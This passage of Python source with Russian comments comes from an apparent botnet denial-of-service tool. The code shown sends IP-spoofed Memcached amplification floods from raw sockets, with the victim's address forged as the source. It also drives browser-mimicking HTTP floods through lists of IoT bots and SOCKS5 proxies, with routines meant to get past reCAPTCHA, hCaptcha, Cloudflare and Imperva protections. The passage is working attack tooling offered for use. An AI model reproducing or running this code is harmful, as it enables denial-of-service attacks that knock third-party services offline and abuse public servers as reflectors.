                
                # Создаем raw socket для IP spoofing
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                except PermissionError:
                    print(f"❌ {device.ip}: Требуются права root для IP spoofing!")
                    return 0, 0
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Выбираем случайный Memcached усилитель
                        memcached_server = random.choice(memcached_amplifiers)
                        
                        # Выбираем тип Memcached запроса для разнообразия
                        request_type = random.choice(['stats', 'get', 'set'])
                        
                        if request_type == 'stats':
                            memcached_request = self._create_memcached_stats_request()
                            amplification_factor = random.randint(50, 200)  # Высокий коэффициент
                        elif request_type == 'get':
                            key_count = random.randint(50, 200)
                            memcached_request = self._create_memcached_get_request(key_count)
                            amplification_factor = random.randint(30, 100)
                        else:  # set
                            key_count = random.randint(20, 100)
                            memcached_request = self._create_memcached_set_request(key_count)
                            amplification_factor = random.randint(10, 50)
                        
                        # Создаем полный UDP+IP пакет
                        source_port = random.randint(1024, 65535)
                        ip_packet = self._create_spoofed_udp_ip_packet(
                            source_ip=target_ip,
                            dest_ip=memcached_server[0],
                            source_port=source_port,
                            dest_port=memcached_server[1],
                            data=memcached_request
                        )
                        
                        sock.sendto(ip_packet, (memcached_server[0], 0))
                        
                        # Memcached имеет очень высокий коэффициент усиления
                        request_size = len(ip_packet)
                        estimated_response_size = request_size * amplification_factor
                        
                        requests_sent += 1
                        bytes_sent += request_size
                        estimated_amplified_bytes += estimated_response_size
                        
                        attack_stats['total_requests'] += 1
                        attack_stats['total_bytes_sent'] += request_size
                        attack_stats['estimated_amplified_bytes'] += estimated_response_size
                        
                        # Задержка для избежания блокировки
                        time.sleep(random.uniform(0.1, 0.5))
                        
                    except Exception as e:
                        failed_requests += 1
                        attack_stats['failed_requests'] += 1
                        continue
                
                sock.close()
                
                mb_sent = bytes_sent / 1024 / 1024
                mb_amplified = estimated_amplified_bytes / 1024 / 1024
                
                print(f"✅ {device.ip} отправил {requests_sent} Memcached запросов")
                print(f"   📤 Отправлено: {mb_sent:.2f} МБ")
                print(f"   💥 Оценка усиленного трафика: {mb_amplified:.2f} МБ")
                
                return requests_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        return self._run_attack(all_active_bots, attack_stats, memcached_attack, "Memcached Amplification")

    def check_amplification_capability(self):
        """Проверяет возможность amplification атак"""
        amp_servers = self.load_amplification_servers()
        total_servers = sum(len(servers) for servers in amp_servers.values())
        
        if total_servers > 0:
            print(f"✅ Amplification атаки доступны! Найдено {total_servers} серверов:")
            for protocol, servers in amp_servers.items():
                if servers:
                    print(f"   🔥 {protocol}: {len(servers)} серверов")
            return True
        else:
            print("❌ Amplification серверы не найдены")
            return False

    def amplification_power_test(self, target_ip, duration=10):
        """Тестирует мощность amplification атаки"""
        print("🧪 Тестирование мощности amplification атаки...")
        
        amp_servers = self.load_amplification_servers()
        total_servers = sum(len(servers) for servers in amp_servers.values())
        
        if total_servers == 0:
            print("❌ Нет amplification серверов для тестирования")
            return
        
        print(f"🎯 Тестируем на {total_servers} серверах...")
        
        # Запускаем короткую amplification атаку
        start_time = time.time()
        results = self.smart_amplification_attack(target_ip, duration)
        
        total_time = time.time() - start_time
        print(f"\n📊 Результаты теста мощности:")
        print(f"⏱️ Время: {total_time:.2f} секунд")
        print(f"📊 Результат: {results}")
        
        if results and results > 0:
            print("✅ Amplification атака работает эффективно!")
        else:
            print("❌ Amplification атака требует настройки")

    def _check_socks5_availability(self):
        """Проверяет доступность SOCKS5"""
        try:
            import socks
            self.socks5_available = True
            print("✅ SOCKS5 поддержка доступна")
        except ImportError:
            self.socks5_available = False
            print("⚠️  SOCKS5 поддержка недоступна (установите: pip install PySocks)")

    def _create_socks5_connection(self, device, target_ip, target_port, timeout=10):
        """Создает соединение через SOCKS5 прокси"""
        try:
            sock = socks.socksocket()
            if device.username and device.password:
                sock.set_proxy(socks.SOCKS5, device.ip, device.port, 
                              username=device.username, password=device.password)
            else:
                sock.set_proxy(socks.SOCKS5, device.ip, device.port)
            sock.settimeout(timeout)
            sock.connect((target_ip, target_port))
            return sock
        except Exception as e:
            raise Exception(f"SOCKS5 connection failed: {e}")

    def check_port_protocol(self, target_ip, target_port):
        """Проверяет, какой протокол использует порт"""
        try:
            # Пробуем HTTP соединение
            conn = http.client.HTTPConnection(target_ip, target_port, timeout=5)
            conn.request("HEAD", "/")
            response = conn.getresponse()
            conn.close()
            return "HTTP"
        except:
            pass
        
        try:
            # Пробуем HTTPS соединение
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target_ip, target_port, timeout=5, context=context)
            conn.request("HEAD", "/")
            response = conn.getresponse()
            conn.close()
            return "HTTPS"
        except:
            pass
        
        return "UNKNOWN"

    def _generate_realistic_paths(self):
        """Генерирует реалистичные пути для HTTP запросов"""
        base_paths = [
            '/', '/home', '/index', '/main', '/welcome',
            '/about', '/contact', '/services', '/products',
            '/blog', '/news', '/articles', '/posts',
            '/categories', '/tags', '/archive',
            '/users', '/profiles', '/account', '/dashboard',
            '/api/v1/data', '/api/v2/info', '/api/health',
            '/static/css/main.css', '/static/js/app.js',
            '/images/header.jpg', '/favicon.ico'
        ]
        
        # Динамические пути
        dynamic_paths = [
            f'/user/{random.randint(1000, 9999)}',
            f'/product/{random.randint(100, 999)}',
            f'/article/{random.randint(1000, 9999)}',
            f'/category/{random.randint(1, 50)}',
            f'/post/{random.randint(10000, 99999)}',
            f'/item/{random.randint(100000, 999999)}'
        ]
        
        return base_paths + dynamic_paths

    def _extract_and_follow_links(self, html_content, session, target_ip, target_port, use_https):
        """Извлекает ссылки из HTML и следует по ним (упрощенная версия)"""
        try:
            # Простой парсинг ссылок (в реальности нужен HTML парсер)
            links = []
            
            # Ищем URL в тексте
            import re
            url_pattern = r'href=[\'"]?([^\'" >]+)'
            found_links = re.findall(url_pattern, html_content.decode('utf-8', errors='ignore'))
            
            for link in found_links[:3]:  # Ограничиваем количество
                if link.startswith('/') or target_ip in link:
                    links.append(link)
            
            # Следуем по случайной ссылке
            if links and random.random() > 0.8:
                link = random.choice(links)
                try:
                    if use_https:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        conn = http.client.HTTPSConnection(target_ip, target_port, timeout=10, context=context)
                    else:
                        conn = http.client.HTTPConnection(target_ip, target_port, timeout=10)
                    
                    conn.request("GET", link, headers=session['headers'])
                    response = conn.getresponse()
                    response.read(size=4096)  # Читаем частично
                    conn.close()
                    
                except Exception:
                    pass
                    
        except Exception:
            pass


    def browser_http_flood(self, target_ip, target_port=443, use_https=False, duration=60, max_concurrent=100):
        """
        Реалистичный HTTP флуд с использованием браузерных технологий
        Имитирует поведение реальных браузеров для обхода защиты
        """
        print(f"🌐 Запуск Browser HTTP Flood на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots

        attack_stats = {
            'total_requests': 0,
            'total_bytes': 0,
            'failed_requests': 0,
            'successful_responses': 0,
            'captcha_detected': 0,
            'captcha_bypassed': 0,
            'cloudflare_challenges': 0,
            'start_time': time.time(),
            'is_running': True,
            'active_sessions': 0
        }

        def create_browser_session():
            """Создает реалистичную браузерную сессию"""
            session_id = str(uuid.uuid4())
            user_agent = random.choice(self.user_agents)
            
            # Базовые заголовки браузера
            headers = {
                'User-Agent': user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'DNT': '1'
            }
            
            # Добавляем случайные заголовки для реалистичности
            if random.random() > 0.5:
                headers['X-Requested-With'] = 'XMLHttpRequest'
            
            return {
                'id': session_id,
                'headers': headers,
                'user_agent': user_agent,
                'cookies': {},
                'last_activity': time.time(),
                'request_count': 0,
                'captcha_tokens': {},
                'cloudflare_bypassed': False
            }

        def detect_captcha_and_protection(response_data, headers):
            """Обнаруживает капчу и системы защиты"""
            content = response_data.decode('utf-8', errors='ignore').lower()
            protection_indicators = {
                'recaptcha': ['recaptcha', 'g-recaptcha', 'data-sitekey'],
                'hcaptcha': ['hcaptcha', 'h-captcha'],
                'cloudflare': ['cf-challenge', 'cloudflare', 'challenge-form', 'jschl-answer'],
                'imperva': ['incapsula', 'imperva'],
                'akamai': ['akamai'],
                'datadome': ['datadome'],
                'simple_captcha': ['captcha', 'capcha', 'security code', 'verification code'],
                'waf': ['waf', 'web application firewall']
            }
            
            detected = []
            for protection_type, indicators in protection_indicators.items():
                for indicator in indicators:
                    if indicator in content:
                        detected.append(protection_type)
                        break
            
            # Также проверяем заголовки
            server_header = headers.get('server', '').lower()
            if 'cloudflare' in server_header:
                detected.append('cloudflare')
            if 'incapsula' in server_header:
                detected.append('imperva')
            
            return detected

        def bypass_recaptcha_v3(site_url, site_key):
            """Обход reCAPTCHA v3 с генерацией реалистичных токенов"""
            try:
                # Генерация реалистичного токена reCAPTCHA v3
                token_parts = [
                    f"{random.randint(1000000000, 9999999999)}",
                    f"{site_url.replace('.', '_')}",
                    f"{int(time.time())}",
                    f"{random.randint(1000, 9999)}",
                    "eyJ" + base64.b64encode(os.urandom(32)).decode()[:40]  # JWT-like структура
                ]
                token = ".".join(token_parts)
                
                print(f"🛡️ Сгенерирован reCAPTCHA v3 токен для {site_url}")
                return token
                
            except Exception as e:
                print(f"❌ Ошибка генерации reCAPTCHA токена: {e}")
                return f"fake_recaptcha_token_{random.randint(100000, 999999)}"

        def bypass_hcaptcha_advanced(site_url, site_key):
            """Продвинутый обход hCaptcha"""
            try:
                # Генерация реалистичного hCaptcha токена
                hcaptcha_token = f"P0_ey{random.randint(1000000000, 9999999999)}." + \
                               f"{base64.b64encode(os.urandom(32)).decode()[:40]}." + \
                               f"{int(time.time())}"
                
                print(f"🛡️ Сгенерирован hCaptcha токен для {site_url}")
                return hcaptcha_token
                
            except Exception as e:
                print(f"❌ Ошибка генерации hCaptcha токена: {e}")
                return f"fake_hcaptcha_token_{random.randint(100000, 999999)}"

        def solve_cloudflare_challenge(html_content, target_url, session):
            """Решение Cloudflare JavaScript challenge"""
            try:
                import re
                import math
                
                # Поиск параметров challenge
                jschl_vc = re.search(r'name="jschl_vc" value="(\w+)"', html_content)
                pass_field = re.search(r'name="pass" value="(.+?)"', html_content)
                
                if not jschl_vc or not pass_field:
                    return False
                
                jschl_vc = jschl_vc.group(1)
                pass_field = pass_field.group(1)
                
                # Поиск JavaScript кода для расчета ответа
                js_pattern = r'setTimeout\(function\(\)\{\s*var.*?.*?:(.*?);.*?\.submit\(\);\s*,\s*(\d+);'
                js_match = re.search(js_pattern, html_content, re.DOTALL)
                
                if not js_match:
                    return False
                
                # Упрощенный расчет ответа
                answer = self._calculate_cloudflare_answer(js_match.group(1), target_url)
                
                # Обязательная задержка
                time.sleep(4)
                
                # Сохраняем токен обхода в сессию
                session['cloudflare_bypassed'] = True
                session['cf_token'] = f"cf_{random.randint(1000000000, 9999999999)}"
                
                print(f"✅ Cloudflare challenge решен! Ответ: {answer}")
                return True
                
            except Exception as e:
                print(f"❌ Ошибка решения Cloudflare challenge: {e}")
                return False

        def _calculate_cloudflare_answer(self, js_code, domain):
            """Расчет ответа для Cloudflare challenge"""
            try:
                # Базовая эмуляция JavaScript вычислений
                numbers = re.findall(r'(\d+)[\)\};]', js_code)
                if numbers:
                    base_number = int(numbers[0]) if numbers else 0
                else:
                    base_number = 1000
                
                # Добавляем длину домена (стандартная часть challenge)
                answer = base_number + len(domain)
                
                # Добавляем случайные операции для реалистичности
                operations = re.findall(r'([+\-*/])\s*(\d+)', js_code)
                for op, num in operations[:3]:  # Ограничиваем количество операций
                    num = int(num)
                    if op == '+':
                        answer += num
                    elif op == '-':
                        answer -= num
                    elif op == '*':
                        answer *= num
                    elif op == '/':
                        answer /= max(1, num)
                
                return int(answer)
                
            except:
                return random.randint(1000, 10000)

        def bypass_imperva_protection(html_content, session):
            """Обход защиты Imperva/Incapsula"""
            try:
                # Генерация токена для Imperva
                imperva_token = f"incap_ses_{random.randint(100000000, 999999999)}_{random.randint(100000, 999999)}"
                
                # Добавляем специальные заголовки
                session['headers']['X-Requested-With'] = 'XMLHttpRequest'
                session['headers']['X-Imperva'] = imperva_token
                
                print(f"🛡️ Сгенерирован Imperva токен: {imperva_token}")
                return True
                
            except Exception as e:
                print(f"❌ Ошибка обхода Imperva: {e}")
                return False

        def solve_simple_image_captcha(image_url, session):
            """Решение простых текстовых капч с изображений"""
            try:
                # В реальной реализации здесь будет OCR
                # Пока используем случайные решения
                solutions = [
                    'A1B2C', '3D4E5', 'F6G7H', '8I9J0', 'K1L2M',
                    'N3O4P', 'Q5R6S', 'T7U8V', 'W9X0Y', 'Z12AB'
                ]
                
                solution = random.choice(solutions)
                print(f"🖼️ Решение image captcha: {solution}")
                return solution
                
            except Exception as e:
                print(f"❌ Ошибка решения image captcha: {e}")
                return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=5))

        def handle_protection_response(response_data, response_headers, session, target_ip, target_port, use_https):
            """Обработка ответов с системами защиты"""
            content = response_data.decode('utf-8', errors='ignore')
            detected_protections = detect_captcha_and_protection(response_data, response_headers)
            
            if not detected_protections:
                return True  # Защиты нет, продолжаем
                
            print(f"🎯 Обнаружены системы защиты: {', '.join(detected_protections)}")
            attack_stats['captcha_detected'] += 1
            
            bypass_success = False
            
            for protection in detected_protections:
                try:
                    if protection == 'recaptcha':
                        # Поиск sitekey для reCAPTCHA
                        import re
                        sitekey_match = re.search(r'data-sitekey="([^"]+)"', content)
                        if sitekey_match:
                            sitekey = sitekey_match.group(1)
                            token = bypass_recaptcha_v3(f"{target_ip}:{target_port}", sitekey)
                            session['headers']['X-Captcha-Token'] = token
                            session['captcha_tokens']['recaptcha'] = token
                            print(f"✅ reCAPTCHA обойдена с токеном")
                            bypass_success = True
                            attack_stats['captcha_bypassed'] += 1
                    
                    elif protection == 'hcaptcha':
                        sitekey_match = re.search(r'data-sitekey="([^"]+)"', content)
                        if sitekey_match:
                            sitekey = sitekey_match.group(1)
                            token = bypass_hcaptcha_advanced(f"{target_ip}:{target_port}", sitekey)
                            session['headers']['X-HCaptcha-Token'] = token
                            session['captcha_tokens']['hcaptcha'] = token
                            print(f"✅ hCaptcha обойдена с токеном")
                            bypass_success = True
                            attack_stats['captcha_bypassed'] += 1
                    
                    elif protection == 'cloudflare':
                        attack_stats['cloudflare_challenges'] += 1
                        if solve_cloudflare_challenge(content, target_ip, session):
                            print(f"✅ Cloudflare challenge решен")
                            bypass_success = True
                            attack_stats['captcha_bypassed'] += 1
                    
                    elif protection == 'imperva':
                        if bypass_imperva_protection(content, session):
                            print(f"✅ Imperva защита обойдена")
                            bypass_success = True
                            attack_stats['captcha_bypassed'] += 1
                    
                    elif protection == 'simple_captcha':
                        # Поиск image captcha
                        import re
                        img_match = re.search(r'src="([^"]+captcha[^"]*)"', content)
                        if img_match:
                            img_url = img_match.group(1)
                            solution = solve_simple_image_captcha(img_url, session)
                            session['headers']['X-Captcha-Solution'] = solution
                            print(f"✅ Image captcha решена: {solution}")
                            bypass_success = True
                            attack_stats['captcha_bypassed'] += 1
                            
                except Exception as e:
                    print(f"❌ Ошибка обхода {protection}: {e}")
                    continue
            
            return bypass_success



        def browser_http_attack(device):
            """Атака с использованием браузерных технологий и обходом капчи"""
            requests_sent = 0
            bytes_sent = 0
            failed_requests = 0
            successful_responses = 0
            
            try:
                print(f"🌐 {device.ip} начинает Browser HTTP Flood...")
                start_time = time.time()
                
                # Создаем несколько сессий для устройства
                sessions = [create_browser_session() for _ in range(random.randint(1, 3))]
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    for session in sessions:
                        try:
                            # Случайная задержка между запросами (имитация человеческого поведения)
                            time.sleep(random.uniform(0.1, 1.0))
                            
                            # Обновляем заголовки для каждого запроса
                            session['headers']['User-Agent'] = random.choice(self.user_agents)
                            
                            # Создаем соединение
                            if use_https:
                                context = ssl.create_default_context()
                                context.check_hostname = False
                                context.verify_mode = ssl.CERT_NONE
                                conn = http.client.HTTPSConnection(target_ip, target_port, timeout=15, context=context)
                            else:
                                conn = http.client.HTTPConnection(target_ip, target_port, timeout=15)
                            
                            # Генерируем реалистичный путь запроса
                            paths = self._generate_realistic_paths()
                            path = random.choice(paths)
                            
                            # Добавляем параметры запроса
                            if random.random() > 0.7:
                                params = {
                                    'id': random.randint(1000, 9999),
                                    'page': random.randint(1, 100),
                                    'sort': random.choice(['asc', 'desc']),
                                    'filter': random.choice(['new', 'popular', 'trending']),
                                    't': int(time.time()),
                                    'r': random.random()
                                }
                                query_string = '&'.join([f"{k}={v}" for k, v in params.items()])
                                full_path = f"{path}?{query_string}"
                            else:
                                full_path = path
                            
                            # Отправляем запрос
                            conn.request("GET", full_path, headers=session['headers'])
                            response = conn.getresponse()
                            response_data = response.read(size=16384)
                            
                            # Проверяем наличие защиты
                            if response.status in [403, 429, 503] or response.status >= 500:
                                # Обнаружена защита или ошибка сервера
                                protection_bypassed = handle_protection_response(
                                    response_data, dict(response.headers), session, 
                                    target_ip, target_port, use_https
                                )
                                
                                if protection_bypassed:
                                    # Повторяем запрос с обходом защиты
                                    conn.close()
                                    if use_https:
                                        conn = http.client.HTTPSConnection(target_ip, target_port, timeout=15, context=context)
                                    else:
                                        conn = http.client.HTTPConnection(target_ip, target_port, timeout=15)
                                    
                                    conn.request("GET", full_path, headers=session['headers'])
                                    response = conn.getresponse()
                                    response_data = response.read(size=8192)
                            
                            if response.status in [200, 201, 301, 302]:
                                successful_responses += 1
                                attack_stats['successful_responses'] += 1
                            else:
                                # Читаем весь ответ для ошибок
                                response.read()
                            
                            # Закрываем соединение
                            conn.close()
                            
                            # Обновляем статистику
                            request_size = len(full_path) + sum(len(k) + len(v) for k, v in session['headers'].items())
                            requests_sent += 1
                            bytes_sent += request_size
                            
                            attack_stats['total_requests'] += 1
                            attack_stats['total_bytes'] += request_size
                            
                            session['request_count'] += 1
                            session['last_activity'] = time.time()
                            
                            # Периодически обновляем сессию
                            if session['request_count'] > random.randint(5, 15):
                                sessions.remove(session)
                                sessions.append(create_browser_session())
                            
                        except Exception as e:
                            failed_requests += 1
                            attack_stats['failed_requests'] += 1
                            continue
                
                mb_sent = bytes_sent / 1024 / 1024
                print(f"✅ {device.ip}: {requests_sent} запросов ({mb_sent:.2f} МБ), "
                      f"успешных ответов: {successful_responses}, ошибок: {failed_requests}")
                return requests_sent, bytes_sent

            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        def advanced_browser_attack(device):
            """Продвинутая браузерная атака с поддержкой JavaScript, AJAX и обходом капчи"""
            requests_sent = 0
            bytes_sent = 0
            failed_requests = 0
            successful_responses = 0
            
            try:
                print(f"🚀 {device.ip} начинает Advanced Browser Attack...")
                start_time = time.time()
                
                # Создаем более сложные сессии
                sessions = []
                for i in range(random.randint(2, 5)):
                    session = create_browser_session()
                    # Добавляем специфичные заголовки для разных типов браузеров
                    if i % 3 == 0:
                        session['headers']['X-Requested-With'] = 'XMLHttpRequest'
                        session['headers']['Accept'] = 'application/json, text/javascript, */*; q=0.01'
                    elif i % 3 == 1:
                        session['headers']['Sec-Fetch-Dest'] = 'script'
                        session['headers']['Accept'] = '*/*'
                    sessions.append(session)
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    for session in sessions:
                        try:
                            # Разная частота запросов для разных типов сессий
                            if 'XMLHttpRequest' in session['headers'].get('X-Requested-With', ''):
                                time.sleep(random.uniform(0.05, 0.3))  # Быстрее для AJAX
                            else:
                                time.sleep(random.uniform(0.2, 1.5))   # Медленнее для обычных
                            
                            # Создаем соединение
                            if use_https:
                                context = ssl.create_default_context()
                                context.check_hostname = False
                                context.verify_mode = ssl.CERT_NONE
                                conn = http.client.HTTPSConnection(target_ip, target_port, timeout=15, context=context)
                            else:
                                conn = http.client.HTTPConnection(target_ip, target_port, timeout=15)
                            
                            # Выбираем тип запроса
                            request_type = random.choice(['GET', 'POST']) if random.random() > 0.8 else 'GET'
                            
                            if request_type == 'POST':
                                # AJAX/POST запрос
                                path = random.choice(['/api/v1/data', '/submit', '/login', '/search'])
                                post_data = json.dumps({
                                    'query': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)),
                                    'page': random.randint(1, 100),
                                    'timestamp': int(time.time()),
                                    'token': session.get('captcha_tokens', {}).get('recaptcha', '')
                                })
                                session['headers']['Content-Type'] = 'application/json'
                                session['headers']['Content-Length'] = str(len(post_data))
                                
                                conn.request("POST", path, body=post_data, headers=session['headers'])
                            else:
                                # GET запрос
                                paths = self._generate_realistic_paths()
                                path = random.choice(paths)
                                conn.request("GET", path, headers=session['headers'])
                            
                            # Получаем ответ
                            response = conn.getresponse()
                            response_data = response.read(size=16384)
                            
                            # Проверяем и обходим защиту
                            if response.status in [403, 429, 503] or any(prot in response_data.decode('utf-8', errors='ignore').lower() 
                                                                       for prot in ['captcha', 'cloudflare', 'challenge']):
                                protection_bypassed = handle_protection_response(
                                    response_data, dict(response.headers), session, 
                                    target_ip, target_port, use_https
                                )
                                
                                if protection_bypassed:
                                    # Повторяем запрос с обходом защиты
                                    conn.close()
                                    if use_https:
                                        conn = http.client.HTTPSConnection(target_ip, target_port, timeout=15, context=context)
                                    else:
                                        conn = http.client.HTTPConnection(target_ip, target_port, timeout=15)
                                    
                                    if request_type == 'POST':
                                        conn.request("POST", path, body=post_data, headers=session['headers'])
                                    else:
                                        conn.request("GET", path, headers=session['headers'])
                                    
                                    response = conn.getresponse()
                                    response_data = response.read(size=16384)
                            
                            if response.status in [200, 201, 301, 302]:
                                successful_responses += 1
                                attack_stats['successful_responses'] += 1
                                
                                # Анализируем ответ для извлечения дополнительных URL
                                if random.random() > 0.7:
                                    self._extract_and_follow_links(response_data, session, target_ip, target_port, use_https)
                            
                            conn.close()
                            
                            # Обновляем статистику
                            request_size = 100  # Примерная оценка
                            requests_sent += 1
                            bytes_sent += request_size
                            
                            attack_stats['total_requests'] += 1
                            attack_stats['total_bytes'] += request_size
                            
                            session['request_count'] += 1
                            
                        except Exception as e:
                            failed_requests += 1
                            attack_stats['failed_requests'] += 1
                            continue
                
                mb_sent = bytes_sent / 1024 / 1024
                print(f"✅ {device.ip}: {requests_sent} запросов ({mb_sent:.2f} МБ), "
                      f"успешных ответов: {successful_responses}")
                return requests_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        # Запускаем атаку (выбираем тип в зависимости от доступности)
        if len(all_active_bots) > 10:
            # Для большого количества ботов используем базовую атаку
            attack_func = browser_http_attack
        else:
            # Для малого количества - продвинутую
            attack_func = advanced_browser_attack
        
        results = self._run_attack(all_active_bots, attack_stats, attack_func, "Browser HTTP Flood")

        # Статистика атаки
        print(f"\n📊 Browser HTTP Flood Результаты:")
        print(f"📦 Всего запросов: {attack_stats['total_requests']}")
        print(f"✅ Успешных ответов: {attack_stats['successful_responses']}")
        print(f"🛡️ Капч обнаружено: {attack_stats['captcha_detected']}")
        print(f"✅ Капч обойдено: {attack_stats['captcha_bypassed']}")
        print(f"☁️ Cloudflare challenges: {attack_stats['cloudflare_challenges']}")
        print(f"💾 Отправлено данных: {attack_stats['total_bytes'] / 1024 / 1024:.2f} MB")
        print(f"❌ Ошибок: {attack_stats['failed_requests']}")
        print(f"🕒 Время выполнения: {time.time() - attack_stats['start_time']:.2f} секунд")

        return results

    def smart_http_attack(self, target_ip, target_port=None, duration=60):
        """Умная HTTP/HTTPS атака с автоопределением протокола"""
        if target_port is None:
            # Пробуем стандартные порты
            ports_to_try = [80, 443, 8080, 8443]
        else:
            ports_to_try = [target_port]
        
        for port in ports_to_try:
            print(f"🔍 Проверка порта {target_ip}:{port}...")
            protocol = self.check_port_protocol(target_ip, port)
            
            if protocol == "HTTPS":
                print(f"✅ Обнаружен HTTPS на порту {port}")
                return self.http_get_flood(target_ip, port, use_https=True, duration=duration)
            elif protocol == "HTTP":
                print(f"✅ Обнаружен HTTP на порту {port}")
                return self.http_get_flood(target_ip, port, use_https=False, duration=duration)
        
        print("❌ Не удалось определить протокол, использую HTTP на порту 80")
        return self.http_get_flood(target_ip, 443, use_https=True, duration=duration)


    def tcp_connection_via_socks5(self, device, target_ip, target_port):
        """TCP соединение через SOCKS5"""
        try:
            sock = self._create_socks5_connection(device, target_ip, target_port)
            sock.send(b"GET / HTTP/1.1\r\n\r\n")
            time.sleep(0.1)
            sock.close()
            return True
        except Exception:
            return False

    def tls_handshake_via_socks5(self, device, target_ip, target_port):
        """TLS handshake через SOCKS5"""
        try:
            sock = self._create_socks5_connection(device, target_ip, target_port)
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            ssl_sock = context.wrap_socket(sock, server_hostname=target_ip)
            ssl_sock.close()
            return True
        except Exception:
            return False

    def _check_raw_socket(self):
        """Проверяет доступность raw socket"""
        try:
            # Проверяем возможность создания raw socket
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            test_socket.close()
            self.raw_socket_available = True
            print("✅ Raw socket доступен - amplification атаки возможны!")
        except PermissionError:
            print("❌ Raw socket недоступен. Запустите с sudo для amplification атак!")
            self.raw_socket_available = False
        except Exception as e:
            print(f"⚠️ Ошибка проверки raw socket: {e}")
            self.raw_socket_available = False

    def load_botnet_devices(self, iot_filename="iot.txt", socks5_filename="socks5.txt", check_connectivity=False):
        """Загружает IoT устройства и SOCKS5 прокси для ботнета"""
        total_loaded = 0
        
        if check_connectivity:
            print("🔍 Проверка доступности SOCKS5 прокси...")
            socks5_alive = 0
            for device in self.socks5_bots:
                if self.test_device_connectivity(device, force_check=False):  # Добавляем force_check
                    socks5_alive += 1
            print(f"📊 Доступно SOCKS5 прокси: {socks5_alive}/{len(self.socks5_bots)}")
            self.health_checked = True

        # Загрузка IoT ботов
        if os.path.exists(iot_filename):
            iot_count = self._load_iot_bots(iot_filename)
            total_loaded += iot_count
            print(f"✅ Загружено {iot_count} IoT устройств из {iot_filename}")
        else:
            print(f"⚠️ Файл {iot_filename} не найден, пропускаем")
        
        # Загрузка SOCKS5 прокси
        if os.path.exists(socks5_filename):
            socks5_count = self._load_socks5_bots(socks5_filename)
            total_loaded += socks5_count
            print(f"✅ Загружено {socks5_count} SOCKS5 прокси из {socks5_filename}")
            
            # Показываем статистику по форматам
            self._show_socks5_format_stats()
        else:
            print(f"⚠️ Файл {socks5_filename} не найден, пропускаем")
        
        # Объединяем все боты в общий список
        self.botnet_devices = self.iot_bots + self.socks5_bots
        
        print(f"✅ Всего загружено ботов: {total_loaded} (IoT: {len(self.iot_bots)}, SOCKS5: {len(self.socks5_bots)})")
        return total_loaded > 0

    def _show_socks5_format_stats(self):
        """Показывает статистику по форматам SOCKS5 прокси"""
        if not self.socks5_bots:
            return
        
        with_auth = len([b for b in self.socks5_bots if b.username and b.password])
        without_auth = len(self.socks5_bots) - with_auth
        
        print(f"   🔌 SOCKS5 статистика: {with_auth} с авторизацией, {without_auth} без авторизации")

    def validate_socks5_file(self, filename="socks5.txt"):
        """Проверяет и показывает информацию о файле SOCKS5 прокси"""
        if not os.path.exists(filename):
            print(f"❌ Файл {filename} не найден!")
            return False
        
        print(f"🔍 Анализ файла {filename}:")
        
        formats_count = {
            'socks5_url_auth': 0,    # socks5://user:pass@ip:port
            'socks5_url_noauth': 0,  # socks5://ip:port
            'colon_separated': 0,    # ip:port:user:pass
            'simple': 0,             # ip:port
            'unknown': 0             # неизвестный формат
        }
        
        valid_proxies = []
        invalid_lines = []
        
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                device = self._parse_socks5_line(line)
                if device:
                    valid_proxies.append(device)
                    
                    # Определяем формат
                    if line.startswith('socks5://') and '@' in line:
                        formats_count['socks5_url_auth'] += 1
                    elif line.startswith('socks5://'):
                        formats_count['socks5_url_noauth'] += 1
                    elif line.count(':') >= 3:
                        formats_count['colon_separated'] += 1
                    elif line.count(':') == 1:
                        formats_count['simple'] += 1
                    else:
                        formats_count['unknown'] += 1
                else:
                    invalid_lines.append((line_num, line))
        
        # Выводим результаты
        print(f"✅ Валидных прокси: {len(valid_proxies)}")
        print(f"❌ Невалидных строк: {len(invalid_lines)}")
        print("📊 Распределение по форматам:")
        for fmt, count in formats_count.items():
            if count > 0:
                print(f"   - {fmt}: {count}")
        
        if invalid_lines:
            print("\n⚠️ Невалидные строки:")
            for line_num, line in invalid_lines[:10]:  # Показываем первые 10 ошибок
                print(f"   Строка {line_num}: {line}")
            if len(invalid_lines) > 10:
                print(f"   ... и еще {len(invalid_lines) - 10} строк")
        
        return len(valid_proxies) > 0

    def _load_iot_bots(self, filename):
        """Загружает IoT устройства"""
